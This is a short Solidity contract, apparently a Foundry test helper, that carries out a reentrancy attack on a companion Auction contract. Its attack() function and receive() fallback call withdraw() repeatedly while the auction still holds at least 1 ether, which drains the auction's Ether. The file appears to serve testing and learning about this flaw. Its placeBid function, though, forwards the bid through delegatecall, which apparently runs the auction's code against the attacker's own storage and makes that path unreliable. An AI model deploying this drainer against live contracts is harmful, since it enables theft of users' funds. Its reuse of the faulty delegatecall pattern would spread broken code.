// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console} from "forge-std/console.sol";
import "./Auction.sol";

/**
 * @title Reentrancy
 * @author Dann Wee
 * @notice This contract is for testing Reentrancy Attacks
 */
contract Reentrancy {
    Auction public auction;

    constructor(address _auctionAddress) {
        auction = Auction(_auctionAddress);
    }

    /**
     * @notice Function to get the auction state
     * @return uint256 The auction state
     */
    function getAuctionState() public view returns (uint256) {
        return uint256(auction.getState());
    }

    /**
     * @notice Function to get the amount of Ether in the contract
     * @return uint256 The amount of Ether in the contract
     */
    function getAmount() public view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice Function to get the token balance of the auction
     * @return uint256 The token balance of the auction
     */
    function getTokenAmount() public view returns (uint256) {
        return auction.getTokenBalance();
    }

    /**
     * @notice Function to place a bid
     * @param qty The quantity of the bid
     */
    function placeBid(uint256 qty) external payable {
        require(msg.value > 0, "Bid amount must be greater than 0");
        bytes memory payload = abi.encodeWithSignature("placeBid(uint256)", qty);
        (bool success,) = address(auction).delegatecall(payload);
        require(success, "Bid placement failed");
    }

    /**
     * @notice Function to attack the auction
     */
    function attack() external payable {
        auction.withdraw();
    }

    /**
     * @notice Fallback function to receive Ether
     */
    receive() external payable {
        if (address(auction).balance >= 1 ether) {
            console.log("Launching reentrancy attack");
            auction.withdraw();
        }
    }

    /**
     * @notice Fallback function for when no other function matches
     */
    fallback() external payable {
        console.log("Fallback function called");
    }
}
